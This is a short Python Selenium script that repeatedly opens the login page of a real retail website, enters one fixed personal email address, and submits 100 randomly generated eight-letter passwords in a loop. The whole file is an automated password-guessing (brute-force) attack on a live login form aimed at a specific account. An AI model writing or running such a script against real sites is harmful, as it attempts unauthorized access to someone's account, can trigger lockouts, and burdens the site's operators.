import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://www.laduree.fr/identification.html")
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_id("rbs-user-login-login")
    usr.clear()
    usr.send_keys("sebastian.gallardo1@mail.udp.cl")
    psw = driver.find_element_by_id("rbs-user-login-password")
    psw.clear()
    str = ''.join(random.choice(letters) for i in range(8))
    psw.send_keys(str)
    time.sleep(2)
    clk = driver.find_element_by_xpath('//*[@id="content-column"]/div/div[1]/div/div[1]/form/fieldset/div[5]/button').click()